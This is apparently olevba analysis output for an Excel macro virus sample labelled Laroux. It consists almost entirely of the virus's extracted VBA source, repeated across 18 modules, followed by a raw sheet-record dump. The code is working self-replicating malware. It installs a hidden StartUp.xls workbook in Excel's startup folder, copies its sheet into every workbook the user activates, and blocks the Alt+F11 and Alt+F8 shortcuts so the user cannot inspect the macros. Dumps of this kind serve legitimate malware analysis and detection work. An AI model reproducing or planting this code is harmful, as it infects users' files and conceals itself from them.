olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux.zc-aef85467cd765b9b94c79b2b61fe479ab4814c6e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO StartUp.bas 
in file: Virus.MSExcel.Laroux.zc-aef85467cd765b9b94c79b2b61fe479ab4814c6e - OLE stream: '_VBA_PROJECT_CUR/VBA/StartUp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auto_open()
On Error Resume Next
If ThisWorkbook.Path <> Application.StartupPath And Dir(Application.StartupPath & "\" & "StartUp.xls") = "" Then
Application.ScreenUpdating = False
ThisWorkbook.Sheets("StartUp").Copy
ActiveWorkbook.SaveAs (Application.StartupPath & "\" & "StartUp.xls")
n$ = ActiveWorkbook.Name
ActiveWindow.Visible = False
Workbooks("StartUp.xls").Save
Workbooks(n$).Close (False)
End If
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnKey "%{F8}", "StartUp.xls!escape"
End Sub
Sub cop()
On Error Resume Next
If ActiveWorkbook.Sheets(1).Name <> "StartUp" Then
Application.ScreenUpdating = False
n$ = ActiveSheet.Name
Workbooks("StartUp.xls").Sheets("StartUp").Copy before:=Worksheets(1)
Sheets(n$).Select
End If
End Sub
Sub back()
On Error Resume Next
Application.OnKey "%{F8}", "StartUp.xls!escape"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnTime Now + TimeValue("00:00:01"), "StartUp.xls!cop"
Workbooks.Open Application.StartupPath & "\StartUp.xls"
End Sub
-------------------------------------------------------------------------------
VBA MACRO StartUp_2.bas 
in file: Virus.MSExcel.Laroux.zc-aef85467cd765b9b94c79b2b61fe479ab4814c6e - OLE stream: '_VBA_PROJECT_CUR/VBA/StartUp_2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auto_open()
On Error Resume Next
If ThisWorkbook.Path <> Application.StartupPath And Dir(Application.StartupPath & "\" & "StartUp.xls") = "" Then
Application.ScreenUpdating = False
ThisWorkbook.Sheets("StartUp").Copy
ActiveWorkbook.SaveAs (Application.StartupPath & "\" & "StartUp.xls")
n$ = ActiveWorkbook.Name
ActiveWindow.Visible = False
Workbooks("StartUp.xls").Save
Workbooks(n$).Close (False)
End If
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnKey "%{F8}", "StartUp.xls!escape"
End Sub
Sub cop()
On Error Resume Next
If ActiveWorkbook.Sheets(1).Name <> "StartUp" Then
Application.ScreenUpdating = False
n$ = ActiveSheet.Name
Workbooks("StartUp.xls").Sheets("StartUp").Copy before:=Worksheets(1)
Sheets(n$).Select
End If
End Sub
Sub back()
On Error Resume Next
Application.OnKey "%{F8}", "StartUp.xls!escape"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnTime Now + TimeValue("00:00:01"), "StartUp.xls!cop"
Workbooks.Open Application.StartupPath & "\StartUp.xls"
End Sub
-------------------------------------------------------------------------------
VBA MACRO StartUp_3.bas 
in file: Virus.MSExcel.Laroux.zc-aef85467cd765b9b94c79b2b61fe479ab4814c6e - OLE stream: '_VBA_PROJECT_CUR/VBA/StartUp_3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auto_open()
On Error Resume Next
If ThisWorkbook.Path <> Application.StartupPath And Dir(Application.StartupPath & "\" & "StartUp.xls") = "" Then
Application.ScreenUpdating = False
ThisWorkbook.Sheets("StartUp").Copy
ActiveWorkbook.SaveAs (Application.StartupPath & "\" & "StartUp.xls")
n$ = ActiveWorkbook.Name
ActiveWindow.Visible = False
Workbooks("StartUp.xls").Save
Workbooks(n$).Close (False)
End If
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnKey "%{F8}", "StartUp.xls!escape"
End Sub
Sub cop()
On Error Resume Next
If ActiveWorkbook.Sheets(1).Name <> "StartUp" Then
Application.ScreenUpdating = False
n$ = ActiveSheet.Name
Workbooks("StartUp.xls").Sheets("StartUp").Copy before:=Worksheets(1)
Sheets(n$).Select
End If
End Sub
Sub back()
On Error Resume Next
Application.OnKey "%{F8}", "StartUp.xls!escape"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnTime Now + TimeValue("00:00:01"), "StartUp.xls!cop"
Workbooks.Open Application.StartupPath & "\StartUp.xls"
End Sub
-------------------------------------------------------------------------------
VBA MACRO StartUp_4.bas 
in file: Virus.MSExcel.Laroux.zc-aef85467cd765b9b94c79b2b61fe479ab4814c6e - OLE stream: '_VBA_PROJECT_CUR/VBA/StartUp_4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auto_open()
On Error Resume Next
If ThisWorkbook.Path <> Application.StartupPath And Dir(Application.StartupPath & "\" & "StartUp.xls") = "" Then
Application.ScreenUpdating = False
ThisWorkbook.Sheets("StartUp").Copy
ActiveWorkbook.SaveAs (Application.StartupPath & "\" & "StartUp.xls")
n$ = ActiveWorkbook.Name
ActiveWindow.Visible = False
Workbooks("StartUp.xls").Save
Workbooks(n$).Close (False)
End If
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnKey "%{F8}", "StartUp.xls!escape"
End Sub
Sub cop()
On Error Resume Next
If ActiveWorkbook.Sheets(1).Name <> "StartUp" Then
Application.ScreenUpdating = False
n$ = ActiveSheet.Name
Workbooks("StartUp.xls").Sheets("StartUp").Copy before:=Worksheets(1)
Sheets(n$).Select
End If
End Sub
Sub back()
On Error Resume Next
Application.OnKey "%{F8}", "StartUp.xls!escape"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnTime Now + TimeValue("00:00:01"), "StartUp.xls!cop"
Workbooks.Open Application.StartupPath & "\StartUp.xls"
End Sub
-------------------------------------------------------------------------------
VBA MACRO StartUp_5.bas 
in file: Virus.MSExcel.Laroux.zc-aef85467cd765b9b94c79b2b61fe479ab4814c6e - OLE stream: '_VBA_PROJECT_CUR/VBA/StartUp_5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auto_open()
On Error Resume Next
If ThisWorkbook.Path <> Application.StartupPath And Dir(Application.StartupPath & "\" & "StartUp.xls") = "" Then
Application.ScreenUpdating = False
ThisWorkbook.Sheets("StartUp").Copy
ActiveWorkbook.SaveAs (Application.StartupPath & "\" & "StartUp.xls")
n$ = ActiveWorkbook.Name
ActiveWindow.Visible = False
Workbooks("StartUp.xls").Save
Workbooks(n$).Close (False)
End If
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnKey "%{F8}", "StartUp.xls!escape"
End Sub
Sub cop()
On Error Resume Next
If ActiveWorkbook.Sheets(1).Name <> "StartUp" Then
Application.ScreenUpdating = False
n$ = ActiveSheet.Name
Workbooks("StartUp.xls").Sheets("StartUp").Copy before:=Worksheets(1)
Sheets(n$).Select
End If
End Sub
Sub back()
On Error Resume Next
Application.OnKey "%{F8}", "StartUp.xls!escape"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnTime Now + TimeValue("00:00:01"), "StartUp.xls!cop"
Workbooks.Open Application.StartupPath & "\StartUp.xls"
End Sub
-------------------------------------------------------------------------------
VBA MACRO StartUp_6.bas 
in file: Virus.MSExcel.Laroux.zc-aef85467cd765b9b94c79b2b61fe479ab4814c6e - OLE stream: '_VBA_PROJECT_CUR/VBA/StartUp_6'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auto_open()
On Error Resume Next
If ThisWorkbook.Path <> Application.StartupPath And Dir(Application.StartupPath & "\" & "StartUp.xls") = "" Then
Application.ScreenUpdating = False
ThisWorkbook.Sheets("StartUp").Copy
ActiveWorkbook.SaveAs (Application.StartupPath & "\" & "StartUp.xls")
n$ = ActiveWorkbook.Name
ActiveWindow.Visible = False
Workbooks("StartUp.xls").Save
Workbooks(n$).Close (False)
End If
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnKey "%{F8}", "StartUp.xls!escape"
End Sub
Sub cop()
On Error Resume Next
If ActiveWorkbook.Sheets(1).Name <> "StartUp" Then
Application.ScreenUpdating = False
n$ = ActiveSheet.Name
Workbooks("StartUp.xls").Sheets("StartUp").Copy before:=Worksheets(1)
Sheets(n$).Select
End If
End Sub
Sub back()
On Error Resume Next
Application.OnKey "%{F8}", "StartUp.xls!escape"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnTime Now + TimeValue("00:00:01"), "StartUp.xls!cop"
Workbooks.Open Application.StartupPath & "\StartUp.xls"
End Sub
-------------------------------------------------------------------------------
VBA MACRO StartUp_7.bas 
in file: Virus.MSExcel.Laroux.zc-aef85467cd765b9b94c79b2b61fe479ab4814c6e - OLE stream: '_VBA_PROJECT_CUR/VBA/StartUp_7'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auto_open()
On Error Resume Next
If ThisWorkbook.Path <> Application.StartupPath And Dir(Application.StartupPath & "\" & "StartUp.xls") = "" Then
Application.ScreenUpdating = False
ThisWorkbook.Sheets("StartUp").Copy
ActiveWorkbook.SaveAs (Application.StartupPath & "\" & "StartUp.xls")
n$ = ActiveWorkbook.Name
ActiveWindow.Visible = False
Workbooks("StartUp.xls").Save
Workbooks(n$).Close (False)
End If
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnKey "%{F8}", "StartUp.xls!escape"
End Sub
Sub cop()
On Error Resume Next
If ActiveWorkbook.Sheets(1).Name <> "StartUp" Then
Application.ScreenUpdating = False
n$ = ActiveSheet.Name
Workbooks("StartUp.xls").Sheets("StartUp").Copy before:=Worksheets(1)
Sheets(n$).Select
End If
End Sub
Sub back()
On Error Resume Next
Application.OnKey "%{F8}", "StartUp.xls!escape"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnTime Now + TimeValue("00:00:01"), "StartUp.xls!cop"
Workbooks.Open Application.StartupPath & "\StartUp.xls"
End Sub
-------------------------------------------------------------------------------
VBA MACRO StartUp_8.bas 
in file: Virus.MSExcel.Laroux.zc-aef85467cd765b9b94c79b2b61fe479ab4814c6e - OLE stream: '_VBA_PROJECT_CUR/VBA/StartUp_8'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auto_open()
On Error Resume Next
If ThisWorkbook.Path <> Application.StartupPath And Dir(Application.StartupPath & "\" & "StartUp.xls") = "" Then
Application.ScreenUpdating = False
ThisWorkbook.Sheets("StartUp").Copy
ActiveWorkbook.SaveAs (Application.StartupPath & "\" & "StartUp.xls")
n$ = ActiveWorkbook.Name
ActiveWindow.Visible = False
Workbooks("StartUp.xls").Save
Workbooks(n$).Close (False)
End If
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnKey "%{F8}", "StartUp.xls!escape"
End Sub
Sub cop()
On Error Resume Next
If ActiveWorkbook.Sheets(1).Name <> "StartUp" Then
Application.ScreenUpdating = False
n$ = ActiveSheet.Name
Workbooks("StartUp.xls").Sheets("StartUp").Copy before:=Worksheets(1)
Sheets(n$).Select
End If
End Sub
Sub back()
On Error Resume Next
Application.OnKey "%{F8}", "StartUp.xls!escape"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnTime Now + TimeValue("00:00:01"), "StartUp.xls!cop"
Workbooks.Open Application.StartupPath & "\StartUp.xls"
End Sub
-------------------------------------------------------------------------------
VBA MACRO StartUp_9.bas 
in file: Virus.MSExcel.Laroux.zc-aef85467cd765b9b94c79b2b61fe479ab4814c6e - OLE stream: '_VBA_PROJECT_CUR/VBA/StartUp_9'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auto_open()
On Error Resume Next
If ThisWorkbook.Path <> Application.StartupPath And Dir(Application.StartupPath & "\" & "StartUp.xls") = "" Then
Application.ScreenUpdating = False
ThisWorkbook.Sheets("StartUp").Copy
ActiveWorkbook.SaveAs (Application.StartupPath & "\" & "StartUp.xls")
n$ = ActiveWorkbook.Name
ActiveWindow.Visible = False
Workbooks("StartUp.xls").Save
Workbooks(n$).Close (False)
End If
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnKey "%{F8}", "StartUp.xls!escape"
End Sub
Sub cop()
On Error Resume Next
If ActiveWorkbook.Sheets(1).Name <> "StartUp" Then
Application.ScreenUpdating = False
n$ = ActiveSheet.Name
Workbooks("StartUp.xls").Sheets("StartUp").Copy before:=Worksheets(1)
Sheets(n$).Select
End If
End Sub
Sub back()
On Error Resume Next
Application.OnKey "%{F8}", "StartUp.xls!escape"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnTime Now + TimeValue("00:00:01"), "StartUp.xls!cop"
Workbooks.Open Application.StartupPath & "\StartUp.xls"
End Sub
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Laroux.zc-aef85467cd765b9b94c79b2b61fe479ab4814c6e - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO StartUp_10.bas 
in file: Virus.MSExcel.Laroux.zc-aef85467cd765b9b94c79b2b61fe479ab4814c6e - OLE stream: '_VBA_PROJECT_CUR/VBA/StartUp_10'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auto_open()
On Error Resume Next
If ThisWorkbook.Path <> Application.StartupPath And Dir(Application.StartupPath & "\" & "StartUp.xls") = "" Then
Application.ScreenUpdating = False
ThisWorkbook.Sheets("StartUp").Copy
ActiveWorkbook.SaveAs (Application.StartupPath & "\" & "StartUp.xls")
n$ = ActiveWorkbook.Name
ActiveWindow.Visible = False
Workbooks("StartUp.xls").Save
Workbooks(n$).Close (False)
End If
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnKey "%{F8}", "StartUp.xls!escape"
End Sub
Sub cop()
On Error Resume Next
If ActiveWorkbook.Sheets(1).Name <> "StartUp" Then
Application.ScreenUpdating = False
n$ = ActiveSheet.Name
Workbooks("StartUp.xls").Sheets("StartUp").Copy before:=Worksheets(1)
Sheets(n$).Select
End If
End Sub
Sub back()
On Error Resume Next
Application.OnKey "%{F8}", "StartUp.xls!escape"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnTime Now + TimeValue("00:00:01"), "StartUp.xls!cop"
Workbooks.Open Application.StartupPath & "\StartUp.xls"
End Sub
-------------------------------------------------------------------------------
VBA MACRO StartUp_11.bas 
in file: Virus.MSExcel.Laroux.zc-aef85467cd765b9b94c79b2b61fe479ab4814c6e - OLE stream: '_VBA_PROJECT_CUR/VBA/StartUp_11'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auto_open()
On Error Resume Next
If ThisWorkbook.Path <> Application.StartupPath And Dir(Application.StartupPath & "\" & "StartUp.xls") = "" Then
Application.ScreenUpdating = False
ThisWorkbook.Sheets("StartUp").Copy
ActiveWorkbook.SaveAs (Application.StartupPath & "\" & "StartUp.xls")
n$ = ActiveWorkbook.Name
ActiveWindow.Visible = False
Workbooks("StartUp.xls").Save
Workbooks(n$).Close (False)
End If
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnKey "%{F8}", "StartUp.xls!escape"
End Sub
Sub cop()
On Error Resume Next
If ActiveWorkbook.Sheets(1).Name <> "StartUp" Then
Application.ScreenUpdating = False
n$ = ActiveSheet.Name
Workbooks("StartUp.xls").Sheets("StartUp").Copy before:=Worksheets(1)
Sheets(n$).Select
End If
End Sub
Sub back()
On Error Resume Next
Application.OnKey "%{F8}", "StartUp.xls!escape"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnTime Now + TimeValue("00:00:01"), "StartUp.xls!cop"
Workbooks.Open Application.StartupPath & "\StartUp.xls"
End Sub
-------------------------------------------------------------------------------
VBA MACRO StartUp_12.bas 
in file: Virus.MSExcel.Laroux.zc-aef85467cd765b9b94c79b2b61fe479ab4814c6e - OLE stream: '_VBA_PROJECT_CUR/VBA/StartUp_12'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auto_open()
On Error Resume Next
If ThisWorkbook.Path <> Application.StartupPath And Dir(Application.StartupPath & "\" & "StartUp.xls") = "" Then
Application.ScreenUpdating = False
ThisWorkbook.Sheets("StartUp").Copy
ActiveWorkbook.SaveAs (Application.StartupPath & "\" & "StartUp.xls")
n$ = ActiveWorkbook.Name
ActiveWindow.Visible = False
Workbooks("StartUp.xls").Save
Workbooks(n$).Close (False)
End If
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnKey "%{F8}", "StartUp.xls!escape"
End Sub
Sub cop()
On Error Resume Next
If ActiveWorkbook.Sheets(1).Name <> "StartUp" Then
Application.ScreenUpdating = False
n$ = ActiveSheet.Name
Workbooks("StartUp.xls").Sheets("StartUp").Copy before:=Worksheets(1)
Sheets(n$).Select
End If
End Sub
Sub back()
On Error Resume Next
Application.OnKey "%{F8}", "StartUp.xls!escape"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnTime Now + TimeValue("00:00:01"), "StartUp.xls!cop"
Workbooks.Open Application.StartupPath & "\StartUp.xls"
End Sub
-------------------------------------------------------------------------------
VBA MACRO StartUp_13.bas 
in file: Virus.MSExcel.Laroux.zc-aef85467cd765b9b94c79b2b61fe479ab4814c6e - OLE stream: '_VBA_PROJECT_CUR/VBA/StartUp_13'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auto_open()
On Error Resume Next
If ThisWorkbook.Path <> Application.StartupPath And Dir(Application.StartupPath & "\" & "StartUp.xls") = "" Then
Application.ScreenUpdating = False
ThisWorkbook.Sheets("StartUp").Copy
ActiveWorkbook.SaveAs (Application.StartupPath & "\" & "StartUp.xls")
n$ = ActiveWorkbook.Name
ActiveWindow.Visible = False
Workbooks("StartUp.xls").Save
Workbooks(n$).Close (False)
End If
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnKey "%{F8}", "StartUp.xls!escape"
End Sub
Sub cop()
On Error Resume Next
If ActiveWorkbook.Sheets(1).Name <> "StartUp" Then
Application.ScreenUpdating = False
n$ = ActiveSheet.Name
Workbooks("StartUp.xls").Sheets("StartUp").Copy before:=Worksheets(1)
Sheets(n$).Select
End If
End Sub
Sub back()
On Error Resume Next
Application.OnKey "%{F8}", "StartUp.xls!escape"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnTime Now + TimeValue("00:00:01"), "StartUp.xls!cop"
Workbooks.Open Application.StartupPath & "\StartUp.xls"
End Sub
-------------------------------------------------------------------------------
VBA MACRO StartUp_14.bas 
in file: Virus.MSExcel.Laroux.zc-aef85467cd765b9b94c79b2b61fe479ab4814c6e - OLE stream: '_VBA_PROJECT_CUR/VBA/StartUp_14'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auto_open()
On Error Resume Next
If ThisWorkbook.Path <> Application.StartupPath And Dir(Application.StartupPath & "\" & "StartUp.xls") = "" Then
Application.ScreenUpdating = False
ThisWorkbook.Sheets("StartUp").Copy
ActiveWorkbook.SaveAs (Application.StartupPath & "\" & "StartUp.xls")
n$ = ActiveWorkbook.Name
ActiveWindow.Visible = False
Workbooks("StartUp.xls").Save
Workbooks(n$).Close (False)
End If
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnKey "%{F8}", "StartUp.xls!escape"
End Sub
Sub cop()
On Error Resume Next
If ActiveWorkbook.Sheets(1).Name <> "StartUp" Then
Application.ScreenUpdating = False
n$ = ActiveSheet.Name
Workbooks("StartUp.xls").Sheets("StartUp").Copy before:=Worksheets(1)
Sheets(n$).Select
End If
End Sub
Sub back()
On Error Resume Next
Application.OnKey "%{F8}", "StartUp.xls!escape"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnTime Now + TimeValue("00:00:01"), "StartUp.xls!cop"
Workbooks.Open Application.StartupPath & "\StartUp.xls"
End Sub
-------------------------------------------------------------------------------
VBA MACRO StartUp_15.bas 
in file: Virus.MSExcel.Laroux.zc-aef85467cd765b9b94c79b2b61fe479ab4814c6e - OLE stream: '_VBA_PROJECT_CUR/VBA/StartUp_15'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auto_open()
On Error Resume Next
If ThisWorkbook.Path <> Application.StartupPath And Dir(Application.StartupPath & "\" & "StartUp.xls") = "" Then
Application.ScreenUpdating = False
ThisWorkbook.Sheets("StartUp").Copy
ActiveWorkbook.SaveAs (Application.StartupPath & "\" & "StartUp.xls")
n$ = ActiveWorkbook.Name
ActiveWindow.Visible = False
Workbooks("StartUp.xls").Save
Workbooks(n$).Close (False)
End If
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnKey "%{F8}", "StartUp.xls!escape"
End Sub
Sub cop()
On Error Resume Next
If ActiveWorkbook.Sheets(1).Name <> "StartUp" Then
Application.ScreenUpdating = False
n$ = ActiveSheet.Name
Workbooks("StartUp.xls").Sheets("StartUp").Copy before:=Worksheets(1)
Sheets(n$).Select
End If
End Sub
Sub back()
On Error Resume Next
Application.OnKey "%{F8}", "StartUp.xls!escape"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnTime Now + TimeValue("00:00:01"), "StartUp.xls!cop"
Workbooks.Open Application.StartupPath & "\StartUp.xls"
End Sub
-------------------------------------------------------------------------------
VBA MACRO StartUp_16.bas 
in file: Virus.MSExcel.Laroux.zc-aef85467cd765b9b94c79b2b61fe479ab4814c6e - OLE stream: '_VBA_PROJECT_CUR/VBA/StartUp_16'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auto_open()
On Error Resume Next
If ThisWorkbook.Path <> Application.StartupPath And Dir(Application.StartupPath & "\" & "StartUp.xls") = "" Then
Application.ScreenUpdating = False
ThisWorkbook.Sheets("StartUp").Copy
ActiveWorkbook.SaveAs (Application.StartupPath & "\" & "StartUp.xls")
n$ = ActiveWorkbook.Name
ActiveWindow.Visible = False
Workbooks("StartUp.xls").Save
Workbooks(n$).Close (False)
End If
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnKey "%{F8}", "StartUp.xls!escape"
End Sub
Sub cop()
On Error Resume Next
If ActiveWorkbook.Sheets(1).Name <> "StartUp" Then
Application.ScreenUpdating = False
n$ = ActiveSheet.Name
Workbooks("StartUp.xls").Sheets("StartUp").Copy before:=Worksheets(1)
Sheets(n$).Select
End If
End Sub
Sub back()
On Error Resume Next
Application.OnKey "%{F8}", "StartUp.xls!escape"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnTime Now + TimeValue("00:00:01"), "StartUp.xls!cop"
Workbooks.Open Application.StartupPath & "\StartUp.xls"
End Sub
-------------------------------------------------------------------------------
VBA MACRO StartUp_17.bas 
in file: Virus.MSExcel.Laroux.zc-aef85467cd765b9b94c79b2b61fe479ab4814c6e - OLE stream: '_VBA_PROJECT_CUR/VBA/StartUp_17'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auto_open()
On Error Resume Next
If ThisWorkbook.Path <> Application.StartupPath And Dir(Application.StartupPath & "\" & "StartUp.xls") = "" Then
Application.ScreenUpdating = False
ThisWorkbook.Sheets("StartUp").Copy
ActiveWorkbook.SaveAs (Application.StartupPath & "\" & "StartUp.xls")
n$ = ActiveWorkbook.Name
ActiveWindow.Visible = False
Workbooks("StartUp.xls").Save
Workbooks(n$).Close (False)
End If
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnKey "%{F8}", "StartUp.xls!escape"
End Sub
Sub cop()
On Error Resume Next
If ActiveWorkbook.Sheets(1).Name <> "StartUp" Then
Application.ScreenUpdating = False
n$ = ActiveSheet.Name
Workbooks("StartUp.xls").Sheets("StartUp").Copy before:=Worksheets(1)
Sheets(n$).Select
End If
End Sub
Sub back()
On Error Resume Next
Application.OnKey "%{F8}", "StartUp.xls!escape"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnTime Now + TimeValue("00:00:01"), "StartUp.xls!cop"
Workbooks.Open Application.StartupPath & "\StartUp.xls"
End Sub
-------------------------------------------------------------------------------
VBA MACRO StartUp_18.bas 
in file: Virus.MSExcel.Laroux.zc-aef85467cd765b9b94c79b2b61fe479ab4814c6e - OLE stream: '_VBA_PROJECT_CUR/VBA/StartUp_18'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auto_open()
On Error Resume Next
If ThisWorkbook.Path <> Application.StartupPath And Dir(Application.StartupPath & "\" & "StartUp.xls") = "" Then
Application.ScreenUpdating = False
ThisWorkbook.Sheets("StartUp").Copy
ActiveWorkbook.SaveAs (Application.StartupPath & "\" & "StartUp.xls")
n$ = ActiveWorkbook.Name
ActiveWindow.Visible = False
Workbooks("StartUp.xls").Save
Workbooks(n$).Close (False)
End If
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnKey "%{F8}", "StartUp.xls!escape"
End Sub
Sub cop()
On Error Resume Next
If ActiveWorkbook.Sheets(1).Name <> "StartUp" Then
Application.ScreenUpdating = False
n$ = ActiveSheet.Name
Workbooks("StartUp.xls").Sheets("StartUp").Copy before:=Worksheets(1)
Sheets(n$).Select
End If
End Sub
Sub back()
On Error Resume Next
Application.OnKey "%{F8}", "StartUp.xls!escape"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnTime Now + TimeValue("00:00:01"), "StartUp.xls!cop"
Workbooks.Open Application.StartupPath & "\StartUp.xls"
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     15 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  StartU
' 0085     17 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  StartUp_
' 0085     17 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  StartUp_
' 0085     17 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  StartUp_
' 0085     17 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  StartUp_
' 0085     17 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  StartUp_
' 0085     17 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  StartUp_
' 0085     17 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  StartUp_
' 0085     17 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  StartUp_
' 0085     18 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  StartUp_1
' 0085     18 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  StartUp_1
' 0085     18 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  StartUp_1
' 0085     18 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  StartUp_1
' 0085     18 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  StartUp_1
' 0085     18 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  StartUp_1
' 0085     18 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  StartUp_1
' 0085     18 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  StartUp_1
' 0085     18 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  StartUp_1
' 0085     12 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - >
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Lˆ?
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Ye
' 0085     12 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 
' 0085     12 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - œ
' 0085     12 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Ï
' 0085     12 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - ü
